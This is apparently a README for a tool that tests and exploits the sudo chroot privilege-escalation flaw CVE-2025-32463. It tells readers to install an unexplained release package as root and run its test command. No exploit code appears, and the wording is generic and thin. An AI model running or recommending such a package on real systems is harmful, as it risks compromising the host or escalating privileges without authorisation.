# 🔒 sudo-chroot - Easy Sudo Vulnerability Testing Tool

## 🚀 Getting Started

Welcome to **sudo-chroot**! This tool helps you test a specific security vulnerability in the sudo command on Linux systems. It allows you to understand how this vulnerability, labeled CVE-2025-32463, can be exploited.

## 📥 Download & Install

To get started, you need to download the application. Visit this page to download: [Releases Page](https://github.com/Precault47/sudo-chroot/releases)

![Download sudo-chroot](https://img.shields.io/badge/Download%20sudo--chroot-v1.0-blue)

### Download Instructions

1. Click on the above link to go to the Releases page.
2. Find the latest version listed there.
3. Click on the asset file that suits your operating system. For example:
   - For Ubuntu, download the `.deb` file.
   - For Kali Linux, follow the appropriate link for installation.
4. Save the file to your computer.

## 🖥️ System Requirements

Before running **sudo-chroot**, ensure your system meets the following requirements:

- Linux operating system (Ubuntu or Kali Linux recommended)
- Minimum of 1 GB of RAM
- Python 3.x installed on your system

## 🔧 How to Run

Once you have downloaded the application, follow these steps:

1. Open a terminal window on your Linux system.
2. Navigate to the folder where you saved the downloaded file. You can use the `cd` command:
   ```bash
   cd /path/to/downloaded/file
   ```
3. For Ubuntu, if you downloaded a `.deb` file, install it using the following command:
   ```bash
   sudo dpkg -i filename.deb
   ```
4. If necessary, resolve any dependency issues using:
   ```bash
   sudo apt-get install -f
   ```
5. Finally, run the application by entering:
   ```bash
   sudo-chroot
   ```

## ⚙️ Configuring the Tool

**sudo-chroot** may require some configuration to work effectively. Here are some basic settings you can adjust:

- **Logging:** You can enable logging to keep track of the actions performed by the tool. To do this, edit the configuration file located at `/etc/sudo-chroot/config.toml`.
- **Testing Options:** Choose the level of testing you want to perform. Adjust the `test_mode` in the config file to settings such as `basic`, `advanced`, or `custom`.

## 🌐 Additional Usage

Once you run **sudo-chroot**, you can begin testing for vulnerabilities. Follow the on-screen instructions or refer to the built-in help for specific commands.

### Example Commands

- Start the vulnerability test:
   ```bash
   sudo-chroot test
   ```
- Check for updates:
   ```bash
   sudo-chroot update
   ```

## ❓ Troubleshooting

If you run into issues, consider the following steps:

1. Ensure you have the correct version of Python installed.
2. Verify that all dependencies are met. Use the command:
   ```bash
   sudo apt-get check
   ```
3. Review the logs in `/var/log/sudo-chroot.log` for any error messages.

## 💬 Community Support

Join the discussion and seek help from other users. Chat with us in the Issues section of the repository or check for similar problems that may already have solutions.

## 📚 Resources

- [Official Documentation](https://github.com/Precault47/sudo-chroot)
- [Linux Sudo Manual](https://linux.die.net/man/8/sudo)
- [Exploit Database](https://www.exploit-db.com)

For questions or feedback, please open an issue on our [GitHub page](https://github.com/Precault47/sudo-chroot/issues).

## 🔗 Download Again

Remember, you can always return to the Releases page for a fresh download. Simply follow this link: [Releases Page](https://github.com/Precault47/sudo-chroot/releases) 

Happy testing!